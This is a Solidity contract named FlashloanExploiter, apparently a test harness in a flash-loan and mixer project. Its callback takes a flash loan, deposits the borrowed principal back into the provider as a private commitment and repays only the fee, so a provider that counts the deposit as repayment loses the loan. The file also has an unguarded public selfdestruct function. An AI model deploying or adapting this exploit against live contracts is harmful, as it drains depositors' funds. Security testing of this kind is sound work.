pragma solidity ^0.7.0;

import '../libraries/SafeMathUni.sol';
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

interface FlashLoanProvider {
  function flashLoanFee() external returns (uint);
  function payBack() external payable returns (bool);
  function deposit(bytes32 _commitment) external payable;
  function withdraw(bytes calldata _proof, bytes32 _root, bytes32 _nullifierHash, address payable _recipient, address payable _relayer, uint256 _fee, uint256 _refund) external payable;
  function flashLoan(address _recipient,uint256 _amount,bytes calldata _data) external returns (bool);
  event Deposit(bytes32 indexed commitment, uint32 leafIndex, uint256 timestamp);
  function isKnownRoot(bytes32 _root) external view returns(bool);
}

contract FlashloanExploiter{
  using SafeMathUni for uint;

  event Data(bytes indexed _data);
  event Print(string indexed w);
  event FeeCalculated(uint w);
  event Amount(uint w);

  constructor() public {
  }

  function destroy() public {
    selfdestruct(msg.sender);
  }

  function payableFunction() external payable {}


  function exploit(address _provider, address _recipient, uint _amount, bytes calldata _data) external returns (bool){
    FlashLoanProvider _flashLoanProvider = FlashLoanProvider(_provider);
    (bool success) = _flashLoanProvider.flashLoan(_recipient, _amount, _data);
    require (success, "Error asking for flashloan");
    emit Data(_data);
    return true;
  }

  function avacashFlashLoanCall(bytes calldata _data) external payable returns (bool) {
    FlashLoanProvider _flashLoanProvider = FlashLoanProvider(msg.sender);
    uint _amount = msg.value;
    uint _flashLoanFee = _flashLoanProvider.flashLoanFee();
    //emit FeeCalculated(_flashLoanFee);
    uint _feeAdjusted = _flashLoanFee.mul(_amount);
    //emit FeeCalculated(_feeAdjusted);
    uint _fee = _feeAdjusted.div(10000);

    _flashLoanProvider.deposit{ value: _amount}(convertBytesToBytes32(_data));
    (bool success) = _flashLoanProvider.payBack{value: _fee}();
    require (success, "Error giving back money");
    return true;
  }
  function convertBytesToBytes32(bytes memory inBytes) internal returns (bytes32 outBytes32) {
    if (inBytes.length == 0) {
        return 0x0;
    }
    assembly {
        outBytes32 := mload(add(inBytes, 32))
    }
  }
}
